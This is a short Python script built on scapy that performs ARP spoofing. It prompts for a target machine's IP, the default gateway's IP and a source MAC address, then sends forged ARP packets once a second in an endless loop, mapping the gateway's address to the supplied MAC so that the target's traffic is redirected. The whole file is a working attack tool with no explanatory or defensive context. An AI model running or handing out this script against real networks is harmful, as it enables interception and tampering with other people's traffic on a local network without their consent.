#!/usr/bin/env python

from scapy.all import *
from time import sleep
def spoof():
    dst_ip = raw_input('Enter the machine IP you want to spoof: ')
    src_ip = raw_input('Enter the default gateway IP: ')
    src_hw = raw_input('Enter the source MAC address: ')
    arp_packet = ARP()
    arp_packet.psrc = src_ip
    arp_packet.hwsrc = src_hw
    arp_packet.pdst = dst_ip
    try:
        i = 0
        while 1:
            print("Number of packets sent: "+str(i))
            send(arp_packet, verbose=0)
            i += 1
            sleep(1)
    except:
        print("Exception occured\n")

if __name__=='__main__':
    spoof()
